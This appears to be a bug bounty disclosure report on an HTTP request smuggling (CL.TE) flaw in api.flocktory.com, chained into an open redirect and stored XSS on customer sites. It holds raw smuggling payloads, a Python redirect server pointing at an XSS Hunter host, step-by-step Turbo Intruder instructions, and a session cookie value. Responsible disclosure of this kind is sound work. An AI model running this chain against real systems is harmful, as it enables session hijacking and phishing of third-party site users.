## Original Report

HTTP Request Smuggling is a technique to desync the sequence in which HTTP requests and responses are processed. This particular vulnerability abuses the CLTE variant of HTTP Request Smuggling as described in [PortSwigger's blog](https://portswigger.net/web-security/request-smuggling). The domain api.flocktory.com was found to be vulnerable to this attack through [Defparam's smuggler tool](https://github.com/defparam/smuggler). 

{F943289}

An example of one of the payloads generated by this tool is the xnprespace-04 method:
```
POST /?cb=4900519531250389 HTTP/1.1
X: X
Transfer-Encoding: chunked
Host: api.flocktory.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 4
Cookie:  __flocktory-web_session2=fd73d7f1-2d34-413e-8c2b100a5aeb40f6;

1
Z
0


```

This domain has a 301 redirect from the /underworld endpoint to /underworld/. PortSwigger gives an example of this under [Using HTTP request smuggling to turn an on-site redirect into an open redirect](https://portswigger.net/web-security/request-smuggling/exploiting). Modifying the above payload can be used to turn the HTTP Request Smuggling vulnerability into an open redirect:

```
POST /?cb=4900519531250389 HTTP/1.1
X: X
Transfer-Encoding: chunked
Host: api.flocktory.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 4
Cookie:  __flocktory-web_session2=fd73d7f1-2d34-413e-8c2b100a5aeb40f6;

0

GET https://mysite.com/underworld HTTP/1.1
X: X
```
{F943288}

Using Turbo Intruder to repeatedly send this request will result in a 301 redirect to http://mysite.com:4000/underworld/. Note that the protocol and port change. An attacker can set up a phishing site on http://mysite.com:4000/underworld/ or perform any other actions that open redirects normally allow for.

Since api.flocktory normally responds with javascript, the redirect can be sent to an XSS payload. XSS Hunter can be used as the final destination in the HTTP Request Smuggling chain. Exploiting this will randomly poison any requests for javascript on api.flocktory.com with an attackers XSS payload. This ended up effecting several sites where Flocktory is used as a service.

The attack chain looks like the following:
1. HTTP Request Smuggling vulnerability to create an open redirect
2. From the open redirect, perform a 302 to an XSS Hunter subdomain
3. The next request made to api.flocktory.com for javascript will load the XSS payload instead of the content from api.flocktory.com

---

1. 
Take the open redirect request and send it to Turbo Intruder within BurpSuite. Use the attached script ```smuggle_clte.py``` as the Turbo Intruder script. Modify PrefixEP to a server you are running on port 4000, but don't include the port. Ex: http://mysite.com, but the server is reachable on http://mysite.com:4000
2. 
Set up the 302 redirect to be running on port 4000. The following python script can be run as an example:

    ```
    #!/usr/bin/env python3
  
    import sys
    from http.server import HTTPServer, BaseHTTPRequestHandler

    if len(sys.argv)-1 != 1:
        print("""
    Usage: {} <url>
        """.format(sys.argv[0]))
        sys.exit()

    class Redirect(BaseHTTPRequestHandler):
       def do_GET(self):
           self.send_response(302)
           self.send_header('Location', sys.argv[1])
           self.end_headers()

    HTTPServer(("0.0.0.0", 4000), Redirect).serve_forever()
    ```
    This would be run with
    ``` $ python3 ./redirect.py https://<mysubdomain>.xss.ht/underworld/```
3. 
Start the Turbo Intruder script. You should start to see 301 redirects to http://mysite.com:4000/underworld/. The python redirect script should start to receive HTTP requests and forward them to the XSS payload. After some time XSS Hunter will start to trigger on sites that use Flocktory as a service.

Examples of effected customers:

Loaded via ```<script type="text/javascript" id="" src="//api.flocktory.com/v2/loader.js?site_id=399">```

{F943290}

Loaded via ```<script type="text/javascript" src="//api.flocktory.com/v2/loader.js?site_id=1554" async="async">```

### Recommendations

Per [James Kettle](https://hackerone.com/reports/498052), 

*  Disable connection reuse between the proxy and backend systems (or maybe switch to HTTP/2)
*  Make the frontend reject or normalize requests that have both Transfer-Encoding and a Content-Length header

## Impact

An attacker abusing this attack can exploit XSS on companies that use api.flocktory.com for 3rd party javascript. This could be used to perform session hijacking, account takeovers, phishing attacks, etc on Flocktory's customers sites and their own sites.
